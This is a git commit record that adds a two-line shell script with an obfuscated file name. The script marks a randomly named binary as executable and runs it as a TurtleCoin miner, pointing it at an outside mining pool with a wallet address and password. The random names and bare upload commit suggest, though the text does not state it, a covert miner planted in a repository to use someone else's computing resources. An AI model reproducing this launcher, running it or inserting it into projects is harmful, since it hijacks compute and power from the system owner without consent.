49258d07df8e417ba4d7ffc599140a85aa7af4c5
widiastutitiara9 <81446794+widiastutitiara9@users.noreply.github.com>
2021-03-26 22:17:37 +0000

    Add files via upload

---
+++ CpBSAD9T9dyyfGxWj.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+chmod +x ./MtT7Bn9PF5xZm9Ed && ./MtT7Bn9PF5xZm9Ed --pool turtlecoin.herominers.com:10381 --username TRTLv1Qu33jfLgNCavTUh9PomFU9dv7nnEpg7AkzzskDjoziw7j4gSX5gpPRmpJaGvA1gQZYnikeLR78prQNk5bvMFEff95uLRT --password kepin --algorithm turtlecoin
